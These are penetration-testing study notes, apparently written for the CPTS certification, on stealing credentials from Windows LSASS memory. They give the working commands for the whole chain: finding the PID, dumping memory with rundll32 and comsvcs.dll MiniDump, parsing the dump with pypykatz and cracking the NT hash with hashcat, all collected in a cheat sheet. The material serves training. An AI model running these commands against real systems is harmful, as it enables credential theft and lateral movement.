# 🧠 1. Attacking LSASS

> [!info]  
> **LSASS (Local Security Authority Subsystem Service)** is a critical Windows process responsible for authentication, security policy enforcement, and maintaining sensitive authentication material in memory.
> 
> Unlike attacking the **SAM**, which involves extracting password hashes from a database on disk, attacking **LSASS** focuses on extracting credentials and authentication material from **process memory**.

```text
🗄️ SAM Attack
    │
    └──► Credentials stored on disk
              │
              ▼
         Registry Hives
              │
              ▼
          Offline Dump
```

```text
🧠 LSASS Attack
    │
    └──► Credentials stored in memory
              │
              ▼
          LSASS Memory
              │
              ▼
          Memory Dump
              │
              ▼
       Offline Extraction
```

> [!important]  
> **Core distinction:**
> 
> **SAM → credential material on disk**
> 
> **LSASS → credential material in memory**

---

# 🛡️ 2. What LSASS Does

LSASS performs several important functions when a user logs onto Windows.

Upon authentication, LSASS can:

- 🔐 Cache authentication material in memory
    
- 🎫 Create **access tokens**
    
- 🛡️ Enforce security policies
    
- 📜 Write security events to the Windows Security Log
    
- 🧬 Maintain authentication material associated with active logon sessions
    

```text
👤 User Login
     │
     ▼
🛡️ LSASS
     │
     ├──► 🔑 Authentication material
     ├──► 🎫 Access token
     ├──► 🛡️ Security policy enforcement
     └──► 📜 Security logging
```

> [!important]  
> Because LSASS may contain authentication material for **currently logged-on users**, obtaining its memory can provide credentials that are not necessarily available from the SAM.

---

# 🎯 3. Why Attack LSASS?

The goal is to obtain a **snapshot of LSASS memory** and analyze it offline.

```text
🎯 Compromised Windows Host
          │
          ▼
   🛡️ LSASS Process
          │
          ▼
    💾 Memory Dump
          │
          ▼
     📤 Transfer
          │
          ▼
   🐧 Attack Host
          │
          ▼
      Pypykatz
          │
          ▼
 🔑 Credential Material
```

### 🧠 Why Dump Offline?

Once the LSASS memory has been dumped:

- The target session doesn't need to remain active.
    
- Credential extraction can happen on the attack machine.
    
- We can analyze the dump repeatedly.
    
- Cracking can be performed at our own pace.
    
- Tools available on Linux can be used against the dump.
    

> [!tip]  
> **Mental model:**  
> A memory dump is essentially a **snapshot** of LSASS at a particular point in time.
> 
> If a user was logged in when the snapshot was created, authentication material associated with that session may be present.

---

# 💾 4. Dumping LSASS Memory

There are multiple ways to create an LSASS memory dump. Two useful built-in Windows approaches are:

1. 🖥️ **Task Manager**
    
2. 💻 **Rundll32 + Comsvcs.dll**
    

---

# 🖥️ 5. Task Manager Method

If we have an interactive graphical session on the Windows target, Task Manager can create the dump.

### Steps

1. Open **Task Manager**
    
2. Select the **Processes** tab
    
3. Find **Local Security Authority Process**
    
4. Right-click it
    
5. Select **Create dump file**
    

Windows creates:

```text
lsass.DMP
```

The dump is saved in:

```text
%temp%
```

```text
🖥️ Task Manager
      │
      ▼
Local Security Authority Process
      │
      ▼
Right-click
      │
      ▼
Create dump file
      │
      ▼
💾 lsass.DMP
      │
      ▼
📤 Transfer to attack host
```

> [!warning]  
> The Task Manager method requires a **GUI-based interactive session**, making it less useful when you only have a command shell.

---

# 💻 6. Rundll32 + Comsvcs.dll Method

When we only have command-line access, we can use:

```text
rundll32.exe
     +
comsvcs.dll
     +
MiniDump
```

This method is faster and does not require the graphical Task Manager interface.

> [!warning]  
> Modern antivirus/EDR products commonly recognize this technique as malicious behavior and may block it.

---

# 🔎 7. Find the LSASS Process ID (PID)

Before creating the dump, we need the **PID** of `lsass.exe`.

There are several ways to identify it.

## 🖥️ 7.1 Using CMD

Run:

```cmd
C:\Windows\system32> tasklist /svc
```

Relevant output:

```text
Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

The important line is:

```text
lsass.exe                      672
```

Therefore:

```text
LSASS PID = 672
```

---

# ⚡ 8. Find LSASS PID with PowerShell

PowerShell provides a simpler way:

```powershell
PS C:\Windows\system32> Get-Process lsass
```

Example:

```text
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----     ------     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

The important field is:

```text
Id
│
└── 672
```

Therefore:

```text
lsass.exe → PID 672
```

> [!tip]  
> **CPTS shortcut:**
> 
> ```powershell
> Get-Process lsass
> ```
> 
> Look at the **`Id`** field.

---

# 💾 9. Create the LSASS Dump

With an **elevated PowerShell session**, run:

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

The result should be:

```text
C:\lsass.dmp
```

### 🔎 Command Breakdown

```text
rundll32
   │
   ▼
C:\windows\system32\comsvcs.dll
   │
   ▼
MiniDump
   │
   ├── PID → 672
   │
   ├── Output → C:\lsass.dmp
   │
   └── full → Full memory dump
```

Conceptually:

```text
rundll32.exe
      │
      │ Calls exported function
      ▼
comsvcs.dll
      │
      │ MiniDump
      ▼
MiniDumpWriteDump
      │
      ▼
lsass.exe memory
      │
      ▼
C:\lsass.dmp
```

> [!important]  
> The PID **must correspond to the current `lsass.exe` process**. PIDs can change between systems and sessions, so never assume `672` is universally correct.

---

# 📤 10. Transfer the LSASS Dump

Once:

```text
C:\lsass.dmp
```

has been created, transfer it to the attack host using the same file-transfer methodology used for the SAM/SYSTEM/SECURITY hives.

```text
🪟 Windows Target
      │
      │ C:\lsass.dmp
      ▼
   📤 Transfer
      │
      ▼
🐧 Attack Host
      │
      ▼
 Pypykatz Analysis
```

> [!tip]  
> The key advantage is that **credential extraction can now happen offline**.

---

# 🐍 11. Extracting Credentials with Pypykatz

**Pypykatz** is a Python implementation inspired by the functionality of Mimikatz.

It is particularly useful for CPTS because it can run on **Linux attack hosts**.

```text
Mimikatz
   │
   └── Primarily Windows-based

Pypykatz
   │
   └── Python
        │
        └── Can run on Linux
```

This means we don't necessarily need to execute credential extraction tooling directly on the Windows target.

> [!important]  
> **Pypykatz workflow:**
> 
> **Dump LSASS on Windows → transfer `.dmp` → analyze with Pypykatz on Linux**

---

# 🧬 12. Running Pypykatz

The basic syntax is:

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

Example:

```bash
keelwa@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```

### 🔎 Command Breakdown

```text
pypykatz
   │
   ▼
lsa
   │
   └── Analyze Local Security Authority data
          │
          ▼
      minidump
          │
          └── Parse an LSASS minidump
                 │
                 ▼
          /path/to/lsass.dmp
```

---

# 🧠 13. Understanding Pypykatz Output

Pypykatz organizes information by **LogonSession**.

Example:

```text
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
```

A logon session represents an authenticated user's session and may contain multiple types of authentication material.

```text
             LogonSession
                  │
        ┌─────────┼──────────┐
        ▼         ▼          ▼
       MSV     WDIGEST    Kerberos
        │         │          │
        ▼         ▼          ▼
    NT hash    Passwords   Tickets/keys
                  │
                  ▼
                DPAPI
                  │
                  ▼
              Masterkey
```

---

# 🧬 14. MSV Authentication Package

Example:

```text
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
    == MSV ==
        Username: bob
        Domain: DESKTOP-33E7O54
        LM: NA
        NT: 64f12cddaa88057e06a81b54e73b949b
        SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
        DPAPI: NA
```

**MSV** refers to the Windows authentication package associated with validating credentials against the SAM in relevant authentication scenarios.

Pypykatz recovered:

- 🆔 SID
    
- 👤 Username
    
- 🏢 Domain
    
- 🔑 LM hash
    
- 🔑 NT hash
    
- 🔐 SHA1-related credential material
    
- 🔐 DPAPI-related information where available
    

The most immediately useful item in this example is:

```text
NT: 64f12cddaa88057e06a81b54e73b949b
```

> [!important]  
> LSASS can therefore expose an **NT hash directly from memory**, without requiring us to dump the SAM database separately.

---

# 🔓 15. WDIGEST

Example:

```text
== WDIGEST [14ab89]==
    username bob
    domainname DESKTOP-33E7O54
    password None
    password (hex)
```

**WDIGEST** is an older Windows authentication protocol.

Historically, LSASS could cache WDIGEST credentials in **cleartext**.

### 🕰️ Relevant Windows Versions

WDIGEST was enabled by default in older versions including:

```text
Windows XP
Windows Vista
Windows 7
Windows 8
```

and:

```text
Windows Server 2003
Windows Server 2008
Windows Server 2008 R2
Windows Server 2012
```

Modern Windows systems generally have WDIGEST **disabled by default**.

> [!warning]  
> On an older or misconfigured Windows system where WDIGEST is enabled, LSASS memory may contain a user's **cleartext password**.
> 
> This is why historical Windows versions can be particularly valuable targets for LSASS credential dumping.

```text
Old Windows
     │
     ▼
WDIGEST Enabled
     │
     ▼
LSASS
     │
     ▼
Potential Cleartext Password
```

---

# 🎫 16. Kerberos Credentials

Example:

```text
== Kerberos ==
    Username: bob
    Domain: DESKTOP-33E7O54
```

**Kerberos** is the primary authentication protocol used by Active Directory domain environments.

After domain authentication, users can receive **Kerberos tickets** that allow them to access authorized network resources without repeatedly entering their password.

LSASS can cache authentication material associated with Kerberos, including:

- 🔑 Password-related material
    
- 🔐 Encryption keys
    
- 🎫 Kerberos tickets
    
- 🔢 PIN-related material where applicable
    

```text
👤 Domain User
      │
      ▼
🏢 Active Directory
      │
      ▼
🎫 Kerberos Tickets
      │
      ▼
🛡️ LSASS
      │
      ▼
Potential credential/ticket extraction
      │
      ▼
➡️ Access to other domain resources
```

> [!important]  
> Kerberos material extracted from LSASS can be valuable for **lateral movement** within an Active Directory environment, depending on what specific credentials or tickets are obtained.

---

# 🔐 17. DPAPI Masterkeys from LSASS

Pypykatz may also recover DPAPI information from LSASS.

Example:

```text
== DPAPI [14ab89]==
    luid 1354633
    key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
    masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
    sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

### 🧠 Why DPAPI Masterkeys Matter

DPAPI protects secrets used by Windows and applications.

If the necessary **DPAPI masterkey material** is recovered, it can potentially be used to decrypt protected application secrets.

```text
LSASS Memory
     │
     ▼
DPAPI Masterkey
     │
     ▼
Decrypt DPAPI-protected data
     │
     ├── 🌐 Browser credentials
     ├── 🔐 Credential Manager
     ├── 🖥️ RDP credentials
     └── 📧 Application credentials
```

> [!important]  
> This connects the **LSASS attack** with the earlier **DPAPI** section:
> 
> **LSASS → DPAPI masterkey → protected application secrets**

---

# 🔥 18. Cracking an NT Hash Extracted from LSASS

Once Pypykatz provides an NT hash, we can use Hashcat.

Example hash:

```text
64f12cddaa88057e06a81b54e73b949b
```

Hashcat:

```bash
keelwa@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

Recovered password:

```text
64f12cddaa88057e06a81b54e73b949b:Password1
```

### 🧠 Why `-m 1000`?

```text
-m 1000
   │
   └── NTLM / NT hash
```

The hash type is the same regardless of whether the NT hash came from:

```text
SAM
  OR
LSASS memory
```

Therefore:

```text
SAM NT Hash ──────┐
                  ├──► Hashcat -m 1000
LSASS NT Hash ────┘
```

---

# ⚔️ 19. SAM vs LSASS Attacks

|🎯 Feature|🗄️ SAM Attack|🧠 LSASS Attack|
|---|---|---|
|Data location|Disk / Registry|Process memory|
|Primary target|`HKLM\SAM`|`lsass.exe`|
|Main credentials|Local account hashes|Active-session authentication material|
|Requires SYSTEM/Administrator|Typically requires high privileges|Requires sufficient privileges to access/dump LSASS|
|Offline analysis|✅ Yes|✅ Yes|
|NT hashes|✅|✅|
|DCC2|Via `SECURITY`|❌ Not the primary target|
|LSA secrets|Via `SECURITY`|May expose related authentication material|
|Kerberos tickets|❌|✅ Potentially|
|DPAPI material|Via `SECURITY` / other sources|✅ Potentially|
|Cleartext passwords|❌ Generally|⚠️ Possible with vulnerable/legacy WDIGEST|
|Main tools|`secretsdump`|`pypykatz`, Mimikatz|
|Key artifact|`sam.save`|`lsass.dmp`|

---

# 🧠 20. LSASS Attack Workflow

```text
                 🎯 WINDOWS TARGET
                        │
                        ▼
                 🛡️ lsass.exe
                        │
                        ▼
                🔎 Find LSASS PID
                        │
              ┌─────────┴─────────┐
              ▼                   ▼
       tasklist /svc        Get-Process lsass
              │                   │
              └─────────┬─────────┘
                        ▼
                 🆔 LSASS PID
                        │
                        ▼
               💾 Create Dump
                        │
                        ▼
                 C:\lsass.dmp
                        │
                        ▼
                  📤 Transfer
                        │
                        ▼
                  🐧 Attack Host
                        │
                        ▼
               🐍 Pypykatz
                        │
                        ▼
               pypykatz lsa
                    minidump
                        │
          ┌─────────────┼─────────────┐
          ▼             ▼             ▼
         MSV         WDIGEST       Kerberos
          │             │             │
          ▼             ▼             ▼
       NT Hash       Cleartext?    Tickets/Keys
          │
          ▼
     🔥 Hashcat
       -m 1000
          │
          ▼
      🔑 Password
```

---

# 📋 21. LSASS CPTS Cheat Sheet

|🎯 Goal|💻 Command / Technique|🧠 Remember|
|---|---|---|
|Find LSASS PID — CMD|`tasklist /svc`|Find `lsass.exe`|
|Find LSASS PID — PowerShell|`Get-Process lsass`|PID is in `Id`|
|GUI memory dump|Task Manager → LSASS → Create dump file|Requires interactive GUI|
|CLI memory dump|`rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full`|Creates LSASS memory dump|
|Parse dump|`pypykatz lsa minidump <dump>`|Analyze offline|
|Crack NT hash|`hashcat -m 1000 <hash> rockyou.txt`|NT hash mode|
|Main target|`lsass.exe`|Credential material in memory|
|Important output|`MSV`|NT hash and identity information|
|Important output|`WDIGEST`|Possible cleartext password on vulnerable systems|
|Important output|`Kerberos`|Tickets / keys / domain authentication material|
|Important output|`DPAPI`|Masterkeys and related material|

---

# ⚡ 22. High-Value Command Flow

### 🔎 Step 1 — Find PID

```cmd
tasklist /svc
```

or:

```powershell
Get-Process lsass
```

### 💾 Step 2 — Dump LSASS

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

### 📤 Step 3 — Transfer

```text
C:\lsass.dmp
      │
      ▼
Attack Host
```

### 🐍 Step 4 — Parse

```bash
pypykatz lsa minidump /path/to/lsass.dmp
```

### 🔥 Step 5 — Crack NT Hash

```bash
hashcat -m 1000 <NT_HASH> /usr/share/wordlists/rockyou.txt
```

---

# 🧠 23. The Most Important Mental Model

> [!success]  
> **SAM tells you what credentials are stored on disk.**
> 
> **LSASS tells you what authentication material is currently loaded in memory.**

```text
             🪟 WINDOWS HOST
                    │
        ┌───────────┴───────────┐
        ▼                       ▼
    🗄️ DISK                  🧠 MEMORY
        │                       │
        ▼                       ▼
      SAM                    LSASS
        │                       │
        ▼                       ▼
 Local NT Hashes         Active Logon Sessions
                                │
                  ┌─────────────┼─────────────┐
                  ▼             ▼             ▼
                 MSV         WDIGEST       Kerberos
                  │             │             │
                  ▼             ▼             ▼
               NT Hash       Passwords?     Tickets/Keys
                               
                         ┌─────────────┐
                         ▼
                        DPAPI
                         │
                         ▼
                     Masterkeys
```

---

# 🎯 24. Key Takeaways

> [!success]
> 
> - **LSASS** is a core Windows security process that handles authentication and security policy enforcement.
>     
> - LSASS can contain valuable authentication material **in memory** for active logon sessions.
>     
> - A memory dump gives us a **snapshot of LSASS** that can be analyzed offline.
>     
> - **Task Manager** can create an LSASS dump when we have a GUI session.
>     
> - `tasklist /svc` and `Get-Process lsass` can be used to identify the LSASS PID.
>     
> - `rundll32.exe` with `comsvcs.dll` can create an LSASS dump from the command line.
>     
> - Modern AV/EDR commonly detects the `rundll32 + comsvcs.dll MiniDump` technique.
>     
> - **Pypykatz** allows LSASS minidumps to be analyzed from a Linux attack host.
>     
> - The **MSV** section can expose NT hashes associated with logon sessions.
>     
> - **WDIGEST** may expose cleartext passwords on vulnerable legacy systems where it is enabled.
>     
> - **Kerberos** information can expose authentication material such as tickets and encryption keys useful in domain environments.
>     
> - **DPAPI masterkeys** recovered from LSASS can potentially help decrypt protected application credentials.
>     
> - NT hashes extracted from LSASS can be cracked with **Hashcat mode `1000`**.
>     
> - The key difference is:
>     
> 
> ```text
> 🗄️ SAM
>    → Credentials on disk
> 
> 🧠 LSASS
>    → Credentials/authentication material in memory
> ```
> 
> ### 🔥 CPTS Attack Chain
> 
> ```text
> 👑 Sufficient Privileges
>        ↓
> 🧠 Identify LSASS
>        ↓
> 🆔 Find PID
>        ↓
> 💾 Dump Memory
>        ↓
> 📤 Transfer Dump
>        ↓
> 🐍 Pypykatz
>        ↓
> ┌──────┼──────────┬─────────┐
> ▼      ▼          ▼         ▼
> MSV  WDIGEST   Kerberos   DPAPI
> │      │          │         │
> ▼      ▼          ▼         ▼
> NT   Cleartext   Tickets  Masterkeys
> Hash  Passwords   /Keys
> │
> ▼
> 🔥 Hashcat
> │
> ▼
> 🔑 Recovered Credentials
> │
> ▼
> 🔁 Credential Reuse / Further Access
> ```